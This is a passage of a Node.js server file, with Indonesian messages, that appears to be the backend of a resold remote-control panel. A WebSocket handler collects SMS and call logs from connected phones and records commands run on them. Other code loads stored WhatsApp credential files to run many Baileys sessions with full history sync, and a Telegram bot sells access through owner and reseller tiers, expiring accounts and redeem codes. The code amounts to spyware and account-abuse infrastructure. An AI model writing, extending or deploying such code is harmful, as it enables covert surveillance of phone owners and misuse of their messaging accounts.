                console.log(`SMS from ${currentDevice}: ${msg.address}`);
            }
            
            if (msg.type === 'call' && currentUsername && currentDevice) {
                const devicePath = getDevicePath(currentUsername, currentDevice);
                const callPath = path.join(devicePath, 'calls.json');
                let callList = [];
                
                if (fs.existsSync(callPath)) {
                    try {
                        callList = JSON.parse(fs.readFileSync(callPath));
                    } catch (e) {
                        callList = [];
                    }
                }
                
                callList.push(msg);
                
                if (callList.length > 500) {
                    callList = callList.slice(-500);
                }
                
                fs.writeFileSync(callPath, JSON.stringify(callList, null, 2));
                console.log(`Call from ${currentDevice}: ${msg.call_number}`);
            }
            
            if (msg.type === 'command_received' && currentDevice) {
                console.log(`Command ${msg.command} executed on ${currentDevice}`);
            }
            
        } catch (e) {
            console.log("WebSocket error:", e.message);
        }
    });
    
    ws.on('close', () => {
        if (pingInterval) clearInterval(pingInterval);
        if (currentDevice) clients.delete(currentDevice);
        console.log(`Device disconnected: ${currentDevice || 'unknown'}`);
    });
    
    ws.on('error', (err) => {
        console.log("WebSocket client error:", err.message);
    });
});

const waiting = async (ms) => new Promise(resolve => setTimeout(resolve, ms));

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function prepareAuthFolders() {
  const userId = "session";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      console.log("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      console.error("Folder '" + userId + "' Tidak Mengandung Session List Sama Sekali.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    console.error("Buat Folder 'session' Lalu Isi Dengan Sessions.");
    safeExit();
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';

  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';

    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = `${folderPath}/${sessionName}`
      const { state } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        printQRInTerminal: !usePairingCode,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        generateHighQualityLinkPreview: true,
        patchMessageBeforeSending: (message) => {
          const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
          if (requiresPatch) {
            message = {
              viewOnceMessage: {
                message: {
                  messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
                  ...message
                }
              }
            };
          }
          return message;
        },
        version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        logger: pino({ level: 'fatal' }),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
        }
      });

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(`${sessionsFold}/creds.json`);
          console.log(`\n[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          console.log(`\n[${sessionName}] Connection closed. Status: ${statusCode}\n${lastDisconnect.error}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await new Promise((r) => setTimeout(r, 3000));
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            console.log(`\n[${sessionName}] Logged out or max retries reached.`);
            fs.rmSync(folderPath, { recursive: true, force: true });
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      console.log(`\n[${sessionName}] SKIPPED (session tidak valid / belum login)`);
      console.log(err);
      resolve();
    }
  });
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      console.log(`[${sessionName}] Disconnected.`);
    } catch (e) {
      console.log(`[${sessionName}] Gagal disconnect:`, e.message);
    }
    delete activeConnections[sessionName];
  }

  console.log('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

async function connectNewUserSessionsOnly() {
  const userIdFolder = "session";
  const files = prepareAuthFolders();
  if (files.length === 0) return;

  console.log(`[DEBUG] Ditemukan ${files.length} sesi:`, files);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    const sessionFolder = path.join(userIdFolder, baseName);

    if (activeConnections[baseName]) {
      console.log(`[${baseName}] Sudah terhubung, skip.`);
      continue;
    }

    if (!fs.existsSync(sessionFolder)) {
      fs.mkdirSync(sessionFolder, { recursive: true });
      const source = path.join(userIdFolder, file);
      const dest = path.join(sessionFolder, 'creds.json');
      if (!fs.existsSync(dest)) {
        fs.copyFileSync(source, dest);
      }
    }

    connectSession(sessionFolder, baseName);
  }
}

async function refreshUserSessions() {
  await startUserSessions();
}

async function pairingWa(number, owner, attempt = 1) {
  if (attempt >= 5) {
    return false;
  }
  const sessionDir = path.join('session', owner, number);

  if (!fs.existsSync('session')) fs.mkdirSync('session');
  if (!fs.existsSync(sessionDir)) fs.mkdirSync(sessionDir);

  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
  const { version } = await fetchLatestBaileysVersion();

  const sock = makeWASocket({
    printQRInTerminal: !usePairingCode,
    syncFullHistory: true,
    markOnlineOnConnect: true,
    connectTimeoutMs: 60000,
    defaultQueryTimeoutMs: 0,
    keepAliveIntervalMs: 10000,
    generateHighQualityLinkPreview: true,
    patchMessageBeforeSending: (message) => {
      const requiresPatch = !!(message.buttonsMessage || message.templateMessage || message.listMessage);
      if (requiresPatch) {
        message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: { deviceListMetadataVersion: 2, deviceListMetadata: {} },
              ...message
            }
          }
        };
      }
      return message;
    },
    version: (await (await fetch('https://raw.githubusercontent.com/WhiskeySockets/Baileys/master/src/Defaults/baileys-version.json')).json()).version,
    browser: ["Ubuntu", "Chrome", "20.0.04"],
    logger: pino({ level: 'fatal' }),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, pino().child({ level: 'silent', stream: 'store' }))
    }
  });

  sock.ev.on("creds.update", saveCreds);

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const isLoggedOut = lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut;
      if (!isLoggedOut) {
        console.log(`🔄 Reconnecting ${number} Because ${lastDisconnect?.error?.output?.statusCode} Attempt ${attempt}/5`);
        await waiting(3000);
        await pairingWa(number, owner, attempt + 1);
      } else {
        delete activeConnections[number];
      }
    } else if (connection === "open") {
      activeConnections[number] = sock;
      const sourceCreds = path.join(sessionDir, 'creds.json');
      const destCreds = path.join('session', owner, `${number}.json`);

      try {
        await waiting(3000)
        if (fs.existsSync(sourceCreds)) {
          const data = fs.readFileSync(sourceCreds);
          fs.writeFileSync(destCreds, data);
          console.log(`✅ Rewrote session to ${destCreds}`);
        }
      } catch (e) {
        console.error(`❌ Failed to rewrite creds: ${e.message}`);
      }
    }
  });

  return null;
}

async function startUserSessions() {
  const subfolders = fs.readdirSync('session')
    .map(name => path.join('session', name))
    .filter(p => fs.lstatSync(p).isDirectory());

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside session`);

  for (const folder of subfolders) {
    const jsonFiles = fs.readdirSync(folder)
      .filter(file => file.endsWith(".json"))
      .map(file => path.join(folder, file));

    console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

    for (const jsonFile of jsonFiles) {
      const sessionName = `${path.basename(jsonFile, ".json")}`;

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
        continue;
      }

      try {
        console.log(`[START] Connecting session: ${sessionName}`);
        await connectSession(folder, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
      }
    }
  }
}

function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('session', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}

function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

async function handleUserManagement(msg, input, type, action) {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  
  if (type === 'owner' && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ Only developer can manage owners!");
  }
  
  if (type === 'reseller' && !isOwner(userId) && !isAdmin(userId) && !isDeveloper(userId)) {
    return bot.sendMessage(chatId, "❌ No permission to manage resellers!");
  }
  
  let targetUser;
  let fullName = '';
  
  if (msg.reply_to_message) {
    targetUser = msg.reply_to_message.from.id;
    fullName = [msg.reply_to_message.from.first_name, msg.reply_to_message.from.last_name].filter(Boolean).join(' ');
  } else if (input?.startsWith('@')) {
    try {
      const member = await bot.getChatMember(chatId, input);
      targetUser = member.user.id;
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      return bot.sendMessage(chatId, "❌ Invalid username!");
    }
  } else if (input && !isNaN(input)) {
    targetUser = Number(input);
    try {
      const member = await bot.getChatMember(chatId, targetUser);
      fullName = [member.user.first_name, member.user.last_name].filter(Boolean).join(' ');
    } catch {
      fullName = targetUser.toString();
    }
  } else {
    return bot.sendMessage(chatId, "❌ Please reply to a user or provide user ID/username!");
  }
  
  if (!fullName) fullName = targetUser.toString();
  
  const data = loadAdmins();
  const key = type === 'owner' ? 'owners' : 'resellers';
  
  data[key] = data[key].map(id => Number(id));
  
  const isAdd = action.toLowerCase() === 'add';
  const exists = data[key].includes(targetUser);
  
  if ((isAdd && exists) || (!isAdd && !exists)) {
    const actionText = isAdd ? 'already exists' : 'not found';
    return bot.sendMessage(chatId, `❌ User ${actionText} as ${type}!`);
  }
  
  if (isAdd) {
    data[key].push(targetUser);
  } else {
    data[key] = data[key].filter(id => id !== targetUser);
  }
  
  saveAdmins(data);
  
  const actionText = isAdd ? 'added' : 'removed';
  bot.sendMessage(chatId, 
    `✅ User [${fullName}](tg://user?id=${targetUser}) successfully ${actionText} as ${type.toUpperCase()}!`,
    { 
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id 
    }
  );
}

bot.onText(/^\/(add|del)(owner|reseller)\s*(.*)/i, async (msg, match) => {
  const action = match[1];
  const type = match[2];
  const input = match[3];
  await handleUserManagement(msg, input, type, action);
});

bot.onText(/\/start/, async (msg) => {

const chatId = msg.chat.id
const userId = msg.from.id

const userStatus = getUserStatus(userId)

const fullName = `${msg.from.first_name || ""} ${msg.from.last_name || ""}`.trim()
const username = msg.from.username ? `@${msg.from.username}` : fullName

const uptime = process.uptime()
const ram = (process.memoryUsage().rss / 1024 / 1024).toFixed(2)

let text = `
<blockquote><b>
╭━━━〔 CONTROL PANEL 〕━━━╮
┃
┃ 👤 User   : ${username}
┃ 🆔 ID     : <code>${userId}</code>
┃ 🔐 Status : ${userStatus}
┃
┃ 🖥 Runtime : ${Math.floor(uptime / 60)} Minute
┃ 💾 RAM     : ${ram} MB
┃
╰━━━━━━━━━━━━━━━━━━━━━━╯
</b></blockquote>

<b>📡 Select Menu :</b>
`

let keyboard = []

if (hasAccess(userId)) {

keyboard = [
[{ text: "📊 Server", callback_data: "panel_server" },
{ text: "📡 Session", callback_data: "panel_session" }],
[{ text: "👥 User", callback_data: "panel_user" },
{ text: "💰 Reseller", callback_data: "panel_reseller" }],
[{ text: "👑 Owner", callback_data: "panel_owner" }],
[{ text: "👨‍💻 Developer", url: "https://t.me/ItsNixcaL" }]
]
} else {
keyboard = [
[{ text: "👨‍💻 Contact Developer", url: "https://t.me/ItsNixcaL" }]
]}
await bot.sendAnimation(
chatId,
"./media/start.mp4",
{
caption: text,
parse_mode: "HTML",
reply_markup: {
inline_keyboard: keyboard
}
})
})

bot.on("callback_query", async (query) => {

const chatId = query.message.chat.id
const data = query.data

if(data === "panel_server"){

bot.sendMessage(chatId,`
📊 <b>SERVER MENU</b>

• /status
• /ping
• /restart
`,{parse_mode:"HTML"})

}

if(data === "panel_session"){

bot.sendMessage(chatId,`
📡 <b>SESSION MENU</b>

• /listsession
• /connect
• /delsession
`,{parse_mode:"HTML"})

}

if(data === "panel_user"){

bot.sendMessage(chatId,`
👥 <b>USER MENU</b>

• /adduser
• /listuser
`,{parse_mode:"HTML"})

}

if(data === "panel_reseller"){

bot.sendMessage(chatId,`
💰 <b>RESELLER MENU</b>

• /addreseller
• /delreseller
`,{parse_mode:"HTML"})

}

if(data === "panel_owner"){

bot.sendMessage(chatId,`
👑 <b>OWNER MENU</b>

• /addowner
• /delowner
`,{parse_mode:"HTML"})

}

bot.answerCallbackQuery(query.id)

})

bot.onText(/\/listsession/, async (msg) => {

const chatId = msg.chat.id
const sessionDir = path.join(__dirname, "session")

if (!fs.existsSync(sessionDir)) {
return bot.sendMessage(chatId,"❌ Tidak ada folder session")
}

const folders = fs.readdirSync(sessionDir).filter(f => {
return fs.statSync(path.join(sessionDir, f)).isDirectory()
})

if (folders.length === 0) {
return bot.sendMessage(chatId,"📭 Tidak ada session tersimpan")
}

for (let name of folders){

const status = activeConnections[name] ? "🟢 CONNECTED" : "🔴 OFFLINE"

await bot.sendMessage(chatId,

`📡 <b>Session</b>

📱 Nomor : <code>${name}</code>
📊 Status : ${status}
`,
{
parse_mode:"HTML",
reply_markup:{
inline_keyboard:[
[{
text:"🔄 Reconnect",
callback_data:`reconnect_${name}`
},
{
text:"❌ Delete",
callback_data:`delete_${name}`
}]
]}
})
}
})

bot.on("callback_query", async (query) => {

  const data = query.data
  const chatId = query.message.chat.id

  try {

    if (data.startsWith("reconnect_")) {
      const sessionName = data.replace("reconnect_", "")
      await startSession(sessionName)
      await bot.sendMessage(
        chatId,
        `✅ Session <code>${sessionName}</code> berhasil di reconnect`,
        { parse_mode: "HTML" }
      )
    }

    else if (data.startsWith("delete_")) {
      const sessionName = data.replace("delete_", "")
      const sessionPath = path.join(__dirname, "session", sessionName)

      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true })
      }

      if (activeConnections[sessionName]) {
        delete activeConnections[sessionName]
      }

      await bot.sendMessage(
        chatId,
        `🗑 Session <code>${sessionName}</code> berhasil dihapus`,
        { parse_mode: "HTML" }
      )
    }

  } catch (err) {

    await bot.sendMessage(
      chatId,
      `❌ Terjadi error\n\n<code>${err.message}</code>`,
      { parse_mode: "HTML" }
    )

  }

  bot.answerCallbackQuery(query.id)

})

bot.onText(/^\/adduser (.+)$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const userStatus = getUserStatus(userId);
  const input = match[1].split(",");
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  if (msg.chat.type !== 'private') return;
  if (input.length < 2) {
    return bot.sendMessage(chatId, "Format: /adduser username,expiry\nExample: /adduser john,30", { parse_mode: "Markdown" });
  }  
  const [username, expiry] = input.map(item => item.trim());
  const password = username + Math.floor(Math.random() * 1000);
  const users = loadDatabase();
  const expiryDays = parseInt(expiry); 
  if (isNaN(expiryDays)) {
    return bot.sendMessage(chatId, "❌ Expiry must be a number!");
  }  
  if (users.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
  let inlineKeyboard = { inline_keyboard: [] }; 
  if (isDeveloper(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }],
      [{ text: 'Owner', callback_data: `adduser_${username}_owner_${expiry}_${password}` }]
    ];
  }
  else if (isOwner(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }],
      [{ text: 'Reseller', callback_data: `adduser_${username}_reseller_${expiry}_${password}` }]
    ];
  }
  else if (isReseller(userId)) {
    inlineKeyboard.inline_keyboard = [
      [{ text: 'Member', callback_data: `adduser_${username}_member_${expiry}_${password}` }]
    ];
  }
 
  if (inlineKeyboard.inline_keyboard.length > 0) {
    return bot.sendMessage(
      chatId,
      `Select role for user *${username}*:\nExpiry: ${expiryDays} days\nPassword will be auto-generated.`,
      { parse_mode: "Markdown", reply_markup: inlineKeyboard }
    );
  }
});

bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  const data = query.data;
  const userId = query.from.id;
  
  if (data.startsWith("adduser_")) {
    const parts = data.replace("adduser_", "").split("_");
    if (parts.length < 4) return;
    
    const [username, role, expiry, password] = parts;
    
    if (role === 'owner' && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "Only developer can create owner!" });
    }
    
    if (role === 'reseller' && !isAdmin(userId) && !isOwner(userId) && !isDeveloper(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create resellers!" });
    }
    
    if (role === 'member' && !hasAccess(userId)) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to create users!" });
    }    
    const users = loadDatabase();
    const expiryDays = parseInt(expiry);
    const expiryDate = new Date();
    expiryDate.setDate(expiryDate.getDate() + expiryDays);    
    if (users.find(u => u.username === username)) {
      return bot.answerCallbackQuery(query.id, { text: "Username already exists!" });
    }    
    users.push({ username, password, role, expiredDate: expiryDate.toISOString().split("T")[0] });  
    const x = saveDatabase(users);
      bot.editMessageText(
        `User *${username}* successfully added!\n` +
        `Password: \`${password}\`\n` +
        `Role: ${role}\n` +
        `Expired: ${expiryDate.toISOString().split('T')[0]}`,
        {
          chat_id: chatId,
          message_id: query.message.message_id,
          parse_mode: "Markdown"
        }
      );
      bot.answerCallbackQuery(query.id, { text: `User ${username} created as ${role}!` });
  }
  
  if (data.startsWith("view_")) {
    const username = data.replace("view_", "");
    const users = loadDatabase();
    const user = users.find(u => u.username === username);
    
    if (!user) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    
    const viewerRole = getUserStatus(userId);
    const targetRole = user.role;
    if (viewerRole === 'No Access') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    if (viewerRole === 'reseller' && targetRole !== 'member') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }    
    
    if (viewerRole === 'owner' && targetRole === 'owner') {
      return bot.answerCallbackQuery(query.id, { text: "No permission to view this user!" });
    }
    
    const maskedPassword = "*".repeat(user.password.length);
    
    let buttons = [];
    const canDelete = checkDeletePermission(userId, user);
    if (canDelete) {
      buttons.push([{ text: "🗑 Delete User", callback_data: `delete_${user.username}` }]);
    }
    
    buttons.push([{ text: "🔙 Back", callback_data: "back_list" }]);
    
    bot.editMessageText(
      `👤 *User Details*\n` +
      `• Username: *${user.username}*\n` +
      `• Password: \`${maskedPassword}\`\n` +
      `• Role: *${user.role}*\n` +
      `• Expired: *${user.expiredDate}*`,
      {
        chat_id: chatId,
        message_id: query.message.message_id,
        parse_mode: "Markdown",
        reply_markup: { inline_keyboard: buttons }
      }
    );
  }

  if (data.startsWith("delete_")) {
    const username = data.replace("delete_", "");
    const userId = query.from.id;
    
    const users = loadDatabase();
    const userToDelete = users.find(u => u.username === username);
    
    if (!userToDelete) {
      return bot.answerCallbackQuery(query.id, { text: "User not found!" });
    }
    const canDelete = checkDeletePermission(userId, userToDelete);
    if (!canDelete) {
      return bot.answerCallbackQuery(query.id, { text: "No permission to delete this user!" });
    }
    const updatedUsers = users.filter(u => u.username !== username);
    if (saveDatabase(updatedUsers)) {
      bot.answerCallbackQuery(query.id, { text: `User ${username} deleted!` });
    }
    
    const filteredUsers = updatedUsers.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });
    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);    
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  if (data === "back_list") {
    const userId = query.from.id;
    const users = loadDatabase();
    const filteredUsers = users.filter(u => {
      const viewerRole = getUserStatus(userId);
      const targetRole = u.role;
      if (viewerRole === 'reseller' && targetRole !== 'member') return false;
      if (viewerRole === 'owner' && targetRole === 'owner') return false;      
      return true;
    });    
    const buttons = filteredUsers.map(u => [
      { text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }
    ]);  
    let messageText = "📭 No registered users.";
    if (filteredUsers.length > 0) {
      messageText = `📂 *User List:* (${filteredUsers.length} users)`;
    }    
    bot.editMessageText(messageText, {
      chat_id: chatId,
      message_id: query.message.message_id,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
});
function checkDeletePermission(deleterId, targetUser) {
  if (!hasAccess(deleterId)) return false;  
  const deleterRole = getUserStatus(deleterId);
  const targetRole = targetUser.role;
  if (isDeveloper(deleterId)) return true;
  if (isOwner(deleterId)) {
    if (targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isAdmin(deleterId)) {
    if (targetRole === 'admin' || targetRole === 'owner' || targetRole === 'developer') return false;
    return true;
  }
  if (isReseller(deleterId)) {
    return targetRole === 'member';
  }  
  return false;
}

bot.onText(/^\/listuser$/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  
  const users = loadDatabase();
  const userStatus = getUserStatus(userId);
  
  let filteredUsers = users;
  if (userStatus === 'Reseller') {
    filteredUsers = users.filter(u => u.role === 'member');
  } else if (userStatus === 'Admin') {
    filteredUsers = users.filter(u => u.role === 'member' || u.role === 'reseller');
  }

  if (filteredUsers.length === 0) {
    return bot.sendMessage(chatId, "📭 No users found.");
  }

  const buttons = filteredUsers.map(u => {
    return [{ text: `${u.username} (${u.role})`, callback_data: `view_${u.username}` }];
  });

  bot.sendMessage(chatId, `📂 *User List:* (${filteredUsers.length} users)`, {
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
});
function formatUptime(seconds) {
  const h = Math.floor(seconds / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  return `${h}h ${m}m ${s}s`;
}

bot.onText(/^\/status$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;  
  if (!hasAccess(userId)) {
    return bot.sendMessage(chatId, "❌ You don't have permission to use this command!");
  }
  try {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database/database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;
    const pingStart = Date.now();
    const ping = Date.now() - pingStart;
    const text = `*Server Status*
*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Noxtra-Secure*`;

    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
  } catch (err) {
    console.error("❌ Gagal ambil status:", err.message);
    await bot.sendMessage(chatId, "⚠️ Gagal mengambil status server.");
  }
});

bot.onText(/\/addkode(?:\s+(\S+))?(?:\s+(\d+))?/, (msg, match) => {
  try {
    const chatId = msg.chat.id;
    const userId = msg.from.id;

    if (!isAdmin(userId)) {
      return bot.sendMessage(chatId, "❌ Kamu bukan admin.");
    }

    // Validasi format
    if (!match[1] || !match[2]) {
      return bot.sendMessage(chatId, "❌ Format salah.\nContoh: /addkode NOX133 1000");
    }

    const code = match[1].toUpperCase();
    const amount = parseInt(match[2]);

    if (isNaN(amount) || amount <= 0) {
      return bot.sendMessage(chatId, "❌ Amount harus angka > 0");
    }

    // Pastikan file ada
    if (!fs.existsSync("./db_codes.json")) {
      fs.writeFileSync("./db_codes.json", "[]");
    }

    let codes = JSON.parse(fs.readFileSync("./db_codes.json"));

    if (codes.find(c => c.code === code)) {
      return bot.sendMessage(chatId, "❌ Kode sudah ada.");
    }

    codes.push({
      code,
      amount,
      used: false,
      createdAt: new Date().toISOString()
    });

    fs.writeFileSync("./db_codes.json", JSON.stringify(codes, null, 2));

    bot.sendMessage(chatId,
`✅ KODE BERHASIL DITAMBAHKAN

Kode   : ${code}
Amount : ${amount} Coin`
    );

  } catch (err) {
    console.error("❌ ERROR /addkode:", err);
    bot.sendMessage(msg.chat.id, "❌ Terjadi error internal saat addkode.");
  }
});
bot.onText(/\/listkode/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu bukan admin.");
  }

  const codes = loadCodes();

  if (codes.length === 0) {
    return bot.sendMessage(chatId, "📭 Tidak ada kode redeem.");
  }

  let text = "📜 LIST KODE REDEEM\n\n";

  codes.forEach((c, i) => {
    text += `${i + 1}. ${c.code} | ${c.amount} Coin | ${c.used ? "❌ USED" : "✅ READY"}\n`;
  });

  bot.sendMessage(chatId, text);
});
bot.onText(/\/delkode (.+)/, (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  if (!isAdmin(userId)) {
    return bot.sendMessage(chatId, "❌ Kamu bukan admin.");
  }

  const code = match[1].toUpperCase();

  let codes = loadCodes();
  const before = codes.length;

  codes = codes.filter(c => c.code !== code);

  if (codes.length === before) {
    return bot.sendMessage(chatId, "❌ Kode tidak ditemukan.");
  }

  saveCodes(codes);

  bot.sendMessage(chatId, `🗑️ Kode ${code} berhasil dihapus.`);
});

async function startServer() {
  try {
    server.listen(PORT, () => {
  console.log(`🚀 Server + WS aktif di port ${PORT}`);
});
    
    await startUserSessions();
    ToolsController.cleanupExpiredLogins();
    
    console.log('All services started successfully');
  } catch (error) {
    console.log('Error starting server:', error);
  }
}

const RESTART_INTERVAL = 24 * 60 * 60 * 1000;

function kirimStatusServer(pesan) {
  try {
    sendToGroupsUtama(pesan, { parse_mode: "Markdown" });
  } catch (err) {
    console.error("Gagal kirim status ke Telegram:", err.message);
  }
}
(async () => {
    const uptime = formatUptime(process.uptime());
    const ramUsage = process.memoryUsage().rss / 1024 / 1024;
    const cpuLoad = os.loadavg()[0];
    const db = JSON.parse(fs.readFileSync('./database/database.json'));
    const dbLength = Array.isArray(db) ? db.length : Object.keys(db).length;
    const pingStart = Date.now();
    const ping = Date.now() - pingStart;
    const text = `*Server Status*
*Server Online* [${new Date().toLocaleTimeString()}]
*Ping:* ~${ping}ms
*RAM:* ${ramUsage.toFixed(2)} MB
*CPU:* ${cpuLoad.toFixed(2)}
*Uptime:* ${uptime}
*Total Database:* ${dbLength}
*Server Protect*: *Nixcal-Secure*`;
await kirimStatusServer(text);
})();
setInterval(() => {
  console.log("♻️ Auto restarting panel...");
  setTimeout(() => {
    process.exit(0);
  }, 5000);
}, RESTART_INTERVAL);
startServer(); 